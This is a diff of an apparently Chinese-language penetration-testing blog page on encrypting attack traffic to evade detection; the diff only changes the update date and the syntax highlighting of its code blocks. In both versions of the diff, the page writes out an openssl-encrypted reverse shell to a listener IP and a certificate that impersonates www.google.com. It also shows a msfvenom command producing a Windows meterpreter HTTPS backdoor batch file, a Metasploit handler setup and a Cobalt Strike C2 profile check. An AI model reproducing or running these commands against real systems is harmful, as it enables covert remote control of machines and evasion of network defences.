@@ -458,7 +458,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-04-13
+                    2022-08-14
                 </div>
                 
 
@@ -515,7 +515,7 @@
 <li><p>在kali上生成SSL证书的公钥/私钥对</p>
 </li>
 </ol>
-<pre class="line-numbers language-none"><code class="language-none">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days <span class="token number">365</span> -nodes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <blockquote>
 <p>其中各参数：</p>
@@ -524,12 +524,12 @@
 <ol start="2">
 <li>在kali上监听81端口</li>
 </ol>
-<pre class="line-numbers language-none"><code class="language-none">openssl s_server -quiet -key key.pem -cert cert.pem -port 81<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="token number">81</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <ol start="3">
 <li>在目标机器上用openssl反弹加密shell</li>
 </ol>
-<pre class="line-numbers language-none"><code class="language-none">mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.80.137:81 &gt; /t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mkfifo</span> /tmp/s<span class="token punctuation">;</span> /bin/sh -i <span class="token operator">&lt;</span> /tmp/s <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> openssl s_client -quiet -connect <span class="token number">192.168</span>.80.137:81 <span class="token operator">&gt;</span> /t<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <blockquote>
 <p><code>mkfifo /tmp/s;</code>：创建一个管道</p>
@@ -540,25 +540,25 @@
 <p><code>-quiet</code>：不打印出session和证书的信息。同时隐式打开-ign_eof<br><code>-ign_eof</code>：当输入文件到达文件尾的时候并不断开连接<br><code>-connect host:port</code>： 设置服务器地址和端口号。如果没有设置，则默认为本地主机以及端口号4433</p>
 </blockquote>
 <h2 id="MSF流量加密躲避检测"><a href="#MSF流量加密躲避检测" class="headerlink" title="MSF流量加密躲避检测"></a>MSF流量加密躲避检测</h2><p><strong>OpenSSL创建SSL/TLS证书</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
--subj "/C=UK/ST=London/L=London/O=Development/CN=www.google.com" \
--keyout www.google.com.key \
--out www.google.com.crt &amp;&amp; \
-cat www.google.com.key www.google.com.crt &gt; www.google.com.pem &amp;&amp; \
-rm -f www.google.com.key www.google.com.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">openssl req -new -newkey rsa:4096 -days <span class="token number">365</span> -nodes -x509 <span class="token punctuation">\</span>
+-subj <span class="token string">"/C=UK/ST=London/L=London/O=Development/CN=www.google.com"</span> <span class="token punctuation">\</span>
+-keyout www.google.com.key <span class="token punctuation">\</span>
+-out www.google.com.crt <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>
+<span class="token function">cat</span> www.google.com.key www.google.com.crt <span class="token operator">&gt;</span> www.google.com.pem <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>
+<span class="token function">rm</span> -f www.google.com.key www.google.com.crt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><strong>生成后门</strong></p>
-<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_winhttps LHOST=***.***.***.* LPORT=443 PayloadUUIDTracking=true HandlerSSLCert=www.google.com.pem StagerVerifySSLCert=true PayloadUUIDName=ParanoidStagedPSH -f psh-cmd -o pentestlab.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_winhttps <span class="token assign-left variable">LHOST</span><span class="token operator">=</span>***.***.***.* <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">443</span> <span class="token assign-left variable">PayloadUUIDTracking</span><span class="token operator">=</span>true <span class="token assign-left variable">HandlerSSLCert</span><span class="token operator">=</span>www.google.com.pem <span class="token assign-left variable">StagerVerifySSLCert</span><span class="token operator">=</span>true <span class="token assign-left variable">PayloadUUIDName</span><span class="token operator">=</span>ParanoidStagedPSH -f psh-cmd -o pentestlab.bat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><strong>设置监听器</strong></p>
 <p>配置侦听器时还需要使用两个附加选项。这是为了通知处理程序它将使用的证书（与有效负载相同），并在接收到连接时执行SSL证书验证。</p>
-<pre class="line-numbers language-none"><code class="language-none">HandlerSSLCert 
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">HandlerSSLCert 
 StagerVerifySSLCert 
-set payload windows/meterpreter/reverse_winhttps
-set LHOST ***.***.***.*
-set LPORT 443
-set HandlerSSLCert /home/kali/msf/www.google.com.pem 
-set StagerVerifySSLCert true
+<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_winhttps
+<span class="token builtin class-name">set</span> LHOST ***.***.***.*
+<span class="token builtin class-name">set</span> LPORT <span class="token number">443</span>
+<span class="token builtin class-name">set</span> HandlerSSLCert /home/kali/msf/www.google.com.pem 
+<span class="token builtin class-name">set</span> StagerVerifySSLCert <span class="token boolean">true</span>
 exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <img src="流量加密（一）/image-20220413104309924.png">
@@ -677,7 +677,7 @@ set password "123456";
 set alias "yyy";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>c2link检测c2 profile文件是否可用</p>
-<pre class="line-numbers language-none"><code class="language-none">./c2link wkk.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./c2link wkk.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>运行失败会有红色信息</p>
 <p><strong>配置teamserver文件运行上线</strong></p>
